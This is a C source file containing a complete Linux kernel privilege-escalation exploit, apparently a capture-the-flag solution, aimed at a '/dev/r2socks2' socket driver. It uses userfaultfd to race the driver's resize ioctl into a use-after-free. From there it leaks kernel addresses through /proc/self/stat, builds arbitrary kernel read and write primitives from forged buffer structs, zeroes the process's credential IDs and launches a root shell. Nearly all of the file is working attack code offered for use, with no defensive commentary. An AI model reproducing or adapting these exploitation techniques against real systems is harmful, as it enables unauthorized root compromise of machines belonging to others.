#include <stdio.h>
#include <linux/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <poll.h>

#define IOCTL_SOCKS_INIT 	0xc0087301
#define IOCTL_SOCKS_RECV 	0xc0107305
#define IOCTL_SOCKS_RESIZE 	0xc0087306
#define IOCTL_SOCKS_CONNECT 	0xc0407303
#define IOCTL_SOCKS_LISTEN	0xc0407302
#define IOCTL_SOCKS_SEND 	0xc0107304

#define DEVICE_NAME "/dev/r2socks2"
#define MAX_FDS 0x10
#define OFFSET 0x1c5ef0
	
// File descriptors for the opened sockets.
// In private_data of each file opened resides
// the sock_t struct.
int fd[MAX_FDS];

//used when opening the /proc/self/stat
//for seq_operations allocation.

int stat;

// To get different names for every connection.
//
char connections='0';

static int open_device(void){
	return open(DEVICE_NAME, O_RDWR);
}

struct sock_name_param{
	char name[64];
};

struct sock_buffer_param{
	size_t size;
	char* buffer;
};

struct leaks{
	unsigned long a;
	unsigned long b;
	unsigned long c;
	unsigned long d;
};

void print_recv(struct sock_buffer_param *param){
	printf("The buffer we received : %s\n", param->buffer);

}

int uffd;

struct arg_func{
	void (*handler)(unsigned long a, unsigned long b, unsigned long c);
	unsigned int id;
	unsigned long param0;
	unsigned long param1;
	unsigned long param2;
};

void connect_(int x, int y){
	//Initialize the socket by creating a
	//sock_buf_t with buffer of our choosing size
	//The size should be under 0x1000
	ioctl(fd[x], IOCTL_SOCKS_INIT, 0x20);

	//Initalize the other socket with a buffer
	ioctl(fd[y], IOCTL_SOCKS_INIT, 0x20);

	// Trying to make a socket listen
	// link it to the listeners linked list.
	//
	char* name = (char *)malloc(0x30);
	memcpy(name, "SOCKET", 6);
	strcat(name, &connections);
	connections++;
	ioctl(fd[x], IOCTL_SOCKS_LISTEN, name);

	//Trying to connect to our listening socket.
	ioctl(fd[y], IOCTL_SOCKS_CONNECT,name);
	free(name);

}
// ID 0
void control_rip(unsigned long fd1, unsigned long ptr){
	printf("resizing fd[1]!\n");
	ioctl(fd1, IOCTL_SOCKS_RESIZE, 0x80);
	stat = open("/proc/self/stat", O_RDONLY);
	char* buf = (char *)malloc(0x20);
	memset(buf, 'M',0x20);
	
	struct uffdio_copy copy = {
		.src = (long)buf,
		.dst = (long)ptr,
		.len = 0x1000
	};
	if(ioctl(uffd, UFFDIO_COPY, &copy)<0)
	{
		printf("Can't copy!\n");
		exit(-1);
	}
	read(stat, NULL, 0);

}
// Get /proc/self/stat (seq_operations)  leaks.
// ID 1
void leaks_handler(unsigned long  fd1){
	// Send some data from fd0 -> fd1
	// Just to advance the write pointer
	// so I can read afterward.
	printf("resizing fd[1]!\n");
	ioctl(fd1, IOCTL_SOCKS_RESIZE, 0x80);
	stat = open("/proc/self/stat", O_RDONLY);

}


static void * fault_handler_thread(void *arg){
	static struct uffd_msg msg;
	struct arg_func* handler= arg;
	

	for(;;){
		struct pollfd pollfd = {
			.fd = uffd,
			.events = POLLIN
		};

		poll(&pollfd, 1, -1);
		read(uffd, &msg, sizeof msg);

		if(msg.event & UFFD_EVENT_PAGEFAULT){
			struct uffdio_range uffdio_range;
			uffdio_range.start = (u_int64_t)msg.arg.pagefault.address;
			uffdio_range.len = 0x1000;

			/////
			printf("Starting operating in the pthread!\n");
			unsigned int id = handler->id;
			if(id == 0)
				handler->handler(handler->param0, uffdio_range.start, NULL);
			if(id == 1)
				handler->handler(handler->param0, NULL, NULL);
			if(id == 2)
				handler->handler(handler->param0, NULL, NULL);
			if(id == 3)
				handler->handler(handler->param0, handler->param1, NULL);

			printf("Exiting the pthread!\n");
			/////
			ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_range);
		}

	}
	return;
}

char* userfault_chunk(int size, struct arg_func *handler){

	char* ptr = mmap(NULL, size, PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	
	printf("MMAPED chunk : %p\n", ptr);
	uffd = syscall(__NR_userfaultfd, O_CLOEXEC|O_NONBLOCK);

	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;

	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;

	ioctl(uffd, UFFDIO_API, &uffdio_api);

	uffdio_register.range.start = (unsigned long)ptr;
	uffdio_register.range.len = size;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

	ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);
	
	pthread_t thread;
	int p = pthread_create(&thread, NULL, fault_handler_thread, (void *)handler);
	return ptr;
}

struct leaks* get_leaks(void){	
	int i;
	for(i=0; i<2; i++)
		fd[i] = open_device();

	connect_(0, 1);
	struct sock_buffer_param legit_buffer;
	legit_buffer.size = 0x20-1;
	legit_buffer.buffer = (char *)malloc(0x20);
	ioctl(fd[0], IOCTL_SOCKS_SEND, &legit_buffer);
	
	struct arg_func handler;
	handler.handler = &leaks_handler;
	handler.id = 1;
	handler.param0 = fd[1];

	char* ptr = userfault_chunk(0x1000, &handler);
	legit_buffer.buffer = ptr;

	ioctl(fd[1], IOCTL_SOCKS_RECV, &legit_buffer);
	struct leaks* leaks = (struct leaks *)ptr;

	for(i=0; i<2; i++)
		close(fd[i]);

	return leaks;
}
typedef struct sock_buf {
        size_t size;
        unsigned char *buffer;
        size_t read_index;
        size_t write_index;
} sock_buf_t;

struct arb_rw{
	char* ptr;
	int fd0;
	int fd1;
	unsigned long where;
	unsigned long what;
	
};

struct arg_func handler;

// ID 2
void arb_write(struct arb_rw* arb_rw){
	if(arb_rw->what)
		printf("Trying to write %p to %p\n", arb_rw->what, arb_rw->where);
	ioctl(arb_rw->fd1, IOCTL_SOCKS_RESIZE, 0x80);

	// The fd4 will take our freed 0x20 chunk
	// as sock_buf	
	int i;
	for(i=2; i<4; i++)
		fd[i] = open_device();

	connect_(2, 3);
	
	sock_buf_t* mysock_buf = (sock_buf_t*)malloc(sizeof(sock_buf_t));
	mysock_buf->size = 0x300;
	mysock_buf->buffer = arb_rw->where;
	mysock_buf->read_index=0;
	mysock_buf->write_index = 0;

	struct uffdio_copy copy = {
		.src = (long)mysock_buf,
		.dst = (long)arb_rw->ptr,
		.len = 0x1000
	};

	if(ioctl(uffd, UFFDIO_COPY, &copy)<0){
		printf("UFFDIO_COPY failed!\n");
		exit(-1);
	}

	free(mysock_buf);

}

void arb_write_use(unsigned long where, unsigned long what){
	int i;
	for(i=0; i<2; i++)
		fd[i] = open_device();

	connect_(0, 1);
	struct arb_rw *arb_rw = (struct arb_rw *)malloc(sizeof(struct arb_rw));
	arb_rw->fd0   = fd[0];
	arb_rw->fd1   = fd[1];
	arb_rw->where = where;
	arb_rw->what  = what;

	handler.handler = &arb_write;
	handler.param0 = arb_rw;
	handler.id = 2;
	char* ptr = userfault_chunk(0x1000, &handler);
	arb_rw->ptr = ptr;
	
	// to send to fd1.
	struct sock_buffer_param buffer;
	buffer.size = 0x20-1;
	buffer.buffer = ptr;
	ioctl(fd[0], IOCTL_SOCKS_SEND, &buffer);

	// Now that we changed fd2 sock_buf
	// We can send something to it's peer
	// send from fd3, so it's actually writing
	// to our pointer
	buffer.size = 0x20;
	buffer.buffer = calloc(1, 0x20);

	ioctl(fd[3], IOCTL_SOCKS_SEND, &buffer);
	free(arb_rw);

}

void arb_read(unsigned long where, unsigned long ptr){
	printf("ARB read called! %p\n", ptr);
	ioctl(fd[1], IOCTL_SOCKS_RESIZE, 0x80);

	// The fd4 will take our freed 0x20 chunk
	// as sock_buf	
	int i;
	for(i=2; i<4; i++)
		fd[i] = open_device();

	connect_(2, 3);
	
	sock_buf_t* mysock_buf = (sock_buf_t*)malloc(sizeof(sock_buf_t));
	mysock_buf->size = 0x300;
	mysock_buf->buffer = where;
	mysock_buf->read_index= 0;
	mysock_buf->write_index = 0x10;

	struct uffdio_copy copy = {
		.src = (long)mysock_buf,
		.dst = (long)ptr,
		.len = 0x1000
	};

	if(ioctl(uffd, UFFDIO_COPY, &copy)<0){
		printf("UFFDIO_COPY failed!\n");
		exit(-1);
	}

	free(mysock_buf);

}

unsigned long arb_read_use(unsigned long where){
	int i;
	for(i=0; i<2; i++){
		fd[i] = open_device();
	}

	connect_(0, 1);
	// trying to send some data
	// just to increment the write pointer in fd1.
	
	struct sock_buffer_param buffer;
	buffer.size = 0x20-1;
	handler.id = 3;
	handler.handler = &arb_read;
	handler.param0 = where;

	buffer.buffer = userfault_chunk(0x1000, &handler);
	handler.param1 = buffer.buffer;
	ioctl(fd[0], IOCTL_SOCKS_SEND, &buffer);

	// Now trying to receive from fd2.
	buffer.size = 0x8;
	buffer.buffer = (char*)malloc(0x8);
	ioctl(fd[2], IOCTL_SOCKS_RECV, &buffer);
	struct leaks *l = (struct leaks *)buffer.buffer;

	return l->a;
}

void shell(void){
	printf("Root :\n");
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);

}

int main(){

	// Let's get some leaks here
	struct leaks* l = get_leaks();
	printf("The leaks we got : %p\n%p\n%p\n%p\n", l->a, l->b, l->c, l->d);
	unsigned long kernel_base = l->b - OFFSET;
	printf("Kernel base @ %p\n", kernel_base);
	unsigned long init_task = kernel_base + 0x100f740;
	printf("init_task @ %p\n", init_task);
	
	unsigned long task_struct = arb_read_use(init_task + 0x2D0) - 0x2C8;
	printf("task_struct @ %p\n", task_struct);

	unsigned long cred = arb_read_use(task_struct + 0x568);
	printf("Cred struct @ %p\n", cred);
	
	// overwrite *id with 0.	
	arb_write_use(cred+4, 0);

	// Get privileged shell!
	shell();

	return 0;
}
